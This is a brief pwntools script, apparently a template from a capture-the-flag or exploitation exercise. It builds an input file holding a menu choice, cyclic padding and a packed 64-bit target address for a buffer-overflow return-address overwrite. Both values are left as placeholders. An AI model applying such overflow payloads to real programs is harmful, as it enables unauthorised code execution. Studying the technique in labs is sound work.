from pwn import *
buf = cyclic(FILLMEIN) 		# FILL IN WITH AMOUNT OF PADDING
buf2 = p64(FILLMEIN2)		# FILL IN WITH TARGET LOCATION
f =open('input.txt', 'w')	# OUTPUTS A 1 AND A NEWLINE TO SIMULATE THE USER SELECTING THE FIRST MENU OPTION
f.write("1\n")
f.close()
f=open('input.txt','ab')	# OPENS THE FILE IN BINARY MODE TO ALLOW FOR EASY WRITING OF PADDING AND PACKING DATA
f.write(buf)
f.write(buf2)
f.close()



